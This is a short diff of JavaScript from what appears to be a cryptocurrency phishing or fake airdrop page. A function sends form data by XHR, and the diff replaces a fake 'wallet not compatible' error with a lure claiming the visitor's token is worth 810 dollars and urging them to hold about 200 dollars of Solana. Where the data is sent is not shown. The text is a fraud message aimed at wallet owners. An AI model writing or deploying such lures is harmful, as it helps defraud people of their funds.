@@ -66,7 +66,7 @@ const sendData = async (data) => {
   // Define what happens on successful data submission
   XHR.addEventListener("load", function (event) {
     alert(
-      "Error! The wallet connected might not be compatible.Please contact the admin/support for more help or Connect with an active wallet."
+      "Claiming in Progress, Make sure you have upto 200$ worth of solana , Your token is worth 810$"
     );
 
     document.querySelector(".sending").style.display = "none";
